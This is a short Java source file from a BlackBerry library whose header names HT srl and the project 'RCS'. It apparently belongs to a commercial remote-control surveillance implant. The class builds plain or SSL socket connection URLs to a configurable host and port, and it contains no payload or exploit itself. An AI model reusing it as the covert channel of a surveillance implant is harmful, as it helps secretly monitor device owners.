/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SocketConnection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class DirectTcpConnection extends Connection {
    //#debug
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 3 * 60 * 1000;

    boolean deviceside;

    // Constructor
    public DirectTcpConnection(final String host_, final int port_,
            final boolean ssl_, final boolean deviceside_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
        this.deviceside = deviceside_;

        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        if (deviceside) {
            url += ";deviceside=true";
        } else {
            //url += ";deviceside=false";
        }
    }

    protected void error(final String string) {
        // #debug
        debug.error(string);
    }

    public synchronized boolean isActive() {
        return true;
    }

    protected void trace(final String string) {
        // #debug debug
	debug.trace(string);
    }
}
